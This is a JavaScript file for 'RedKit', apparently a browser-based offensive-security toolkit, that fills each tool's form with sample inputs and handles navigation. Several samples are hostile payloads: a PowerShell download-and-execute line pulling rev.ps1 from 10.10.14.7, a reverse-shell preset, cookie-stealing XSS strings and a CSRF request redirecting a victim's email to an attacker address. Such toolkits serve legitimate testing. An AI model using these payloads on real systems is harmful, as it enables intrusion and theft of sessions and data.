/* ============================================================
   RedKit - Navigation: per-tool EXAMPLES + loadTool (load LAST)
   Loaded after js/core.js (uses $, el, TOOLS, helpers).
   ============================================================ */

// ============================================================
// NAVIGATION
// ============================================================
// ============================================================
// Per-tool EXAMPLES — feature-specific sample inputs (not generic defaults)
// ============================================================
// accepts a bare id ("gd-domain") or a full CSS selector (".rt-url", "#x")
const exFill = (idOrSel, val) => {
  const el = $(/^[#.\[]/.test(idOrSel) ? idOrSel : '#' + idOrSel);
  if (!el) return;
  el.value = val;
  el.dispatchEvent(new Event('input', { bubbles: true }));
  el.dispatchEvent(new Event('change', { bubbles: true }));
};
const exClick = (id) => { const el = $('#' + id); if (el) el.click(); };
const exClickText = (txt) => { const b = $$('button').find(x => x.textContent.trim() === txt); if (b) b.click(); };
const exCvss = (vector) => {
  vector.replace(/^CVSS:[\d.]+\//, '').split('/').forEach(pair => {
    const [k, v] = pair.split(':');
    const btn = $(`.metric-options[data-key="${k}"] .metric-btn[data-val="${v}"]`);
    if (btn) btn.click();
  });
};

const EXAMPLES = {
  // ---- Recon ----
  'google-dork': () => { exFill('gd-domain', 'tesla.com'); exClick('gd-gen'); },
  'shodan-dork': () => { exFill('sd-domain', 'tesla.com'); exFill('sd-org', 'Tesla Motors'); exFill('sd-ssl', 'tesla.com'); exClick('sd-gen'); },
  'subdomain-finder': () => { exFill('sf-domain', 'tesla.com'); },
  'dns-lookup': () => { exFill('dns-domain', 'github.com'); exFill('dns-type', 'MX'); exClick('dns-lookup'); },
  'ip-info': () => { exFill('ipi-input', '1.1.1.1'); exClick('ipi-lookup'); },
  'js-analyzer': () => { exFill('js-input', `const API_KEY = "AIzaSyB1a-EXAMPLE-2c3d4e5f6g7h8i9j0";\nconst base = "https://admin-internal.example.com/api/v2";\nfetch(base + "/users?token=" + localStorage.getItem("jwt"));\n// FIXME debug: aws_secret = "AKIAIOSFODNN7EXAMPLE"`); exClick('js-analyze'); },
  'header-analyzer': () => { exFill('hdr-input', `HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html; charset=UTF-8\nSet-Cookie: SESSIONID=8f3b2a; path=/\nX-Powered-By: PHP/7.4.3`); exClick('hdr-analyze'); },
  'url-parser': () => { exFill('up-input', 'https://user:p%40ss@admin.example.com:8443/dashboard/report?id=42&redirect=https%3A%2F%2Fevil.com%2Fsteal#settings'); exClick('up-parse'); },

  // ---- Crypto / Encoding ----
  'base': () => { exFill('base-type', 'base64'); exFill('base-src', 'admin:S3cr3tP@ss!'); },
  'url-encode': () => { exFill('urlc-src', "https://x.com/search?q=<script>alert(1)</script>&next=a b"); },
  'html-encode': () => { exFill('htm-src', '<img src=x onerror=alert(document.cookie)>'); },
  'hex': () => { exFill('hex-src', 'PWNED'); },
  'binary': () => { exFill('bin-src', 'Hi!'); },
  'morse': () => { exFill('morse-src', 'SOS HELP'); },
  'magic': () => { exFill('magic-in', 'ZmxhZ3tyZWRraXRfbWFnaWN9'); },
  'unicode': () => { exFill('uni-in', 'pаypаl.com'); },
  'timestamp': () => { exFill('ts-in', '1700000000'); },
  'hash': () => { exFill('hash-input', 'P@ssw0rd!2024'); exClick('hash-gen'); },
  'hash-id': () => { exFill('hid-input', '5f4dcc3b5aa765d61d8327deb882cf99'); exClick('hid-id'); },
  'jwt': () => { exFill('jwt-input', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'); exClick('jwt-decode'); },
  'cipher': () => { exFill('cip-input', 'Attack at dawn'); exFill('cip-shift', '3'); exClickText('Caesar'); },
  'ps-encode': () => { exFill('pe-in', "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"); },
  'notationer': () => { exFill('not-in', ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n')); },

  // ---- Payloads ----
  'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'https'); exFill('csrf-submit', 'auto'); exClick('csrf-gen'); },
  'dos-gen': () => { exFill('dos-text', 'A'); exFill('dos-count', '50000'); exClick('dos-preview'); },
  'revshell': () => { exFill('rsg-ip', '10.10.14.7'); exFill('rsg-port', '443'); exFill('rsg-shell', 'bash'); exFill('rsg-enc', 'b64'); },

  // ---- Reporting ----
  '3.1': () => { exClick('cvss31-reset'); exCvss('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'); },
  '4.0': () => { exClick('cvss40-reset'); exCvss('CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N'); },
  'report-template': () => {
    const id = window.getLang && window.getLang() === 'id';
    exFill('rt-name', id ? 'Reflected XSS pada parameter pencarian' : 'Reflected XSS in search parameter');
    exFill('rt-type', 'Cross-Site Scripting (Reflected)');
    exFill('rt-cvssver', '3.1');
    exFill('rt-vector', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N');
    exFill('.rt-url', 'https://app.example.com/search?q=test');
    exFill('.rt-ref', 'https://owasp.org/www-community/attacks/xss/');
    exFill('rt-desc', id
      ? 'Parameter `q` pada endpoint pencarian memantulkan input pengguna ke dalam respons HTML tanpa output encoding, sehingga memungkinkan eksekusi JavaScript sembarang pada sesi browser korban.'
      : 'The `q` parameter on the search endpoint reflects user input into the HTML response without output encoding, allowing arbitrary JavaScript execution in the victim’s browser session.');
    exFill('rt-impact', id
      ? 'Penyerang dapat mencuri cookie sesi, melakukan aksi atas nama korban, serta merusak tampilan halaman atau mengalihkan pengguna ke phishing/malware.'
      : 'An attacker can steal session cookies, perform actions as the victim, and deface the page or redirect users to phishing/malware.');
    exFill('rt-rem', id
      ? 'Terapkan output encoding sesuai konteks untuk semua data yang dikendalikan pengguna; pasang Content-Security-Policy yang ketat; validasi dan sanitasi input di sisi server.'
      : 'Context-aware output encoding for all user-controlled data; deploy a strict Content-Security-Policy; validate and sanitize input server-side.');
    exFill('rt-poc', 'GET /search?q=<script>alert(document.cookie)</script>');
    exClick('rt-gen');
  },
};

// Renders a tool into the main pane. Single source of truth for nav state;
// invoked only by the hash router in index.html (#/<tool>).
const loadTool = (key) => {
  const tool = TOOLS[key];
  if (!tool) return;
  $('#currentToolTitle').textContent = tool.title;
  $('#currentToolDesc').textContent = tool.desc;
  $('#content').innerHTML = tool.render();
  if (tool.init) tool.init();
  if (window.translateUI) window.translateUI();
  const exBtn = $('#rk-example-btn');
  if (exBtn) {
    const ex = EXAMPLES[key];
    exBtn.style.display = ex ? '' : 'none';
    exBtn.onclick = ex || null;
  }
  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.tool === key));
};
window.loadTool = loadTool;
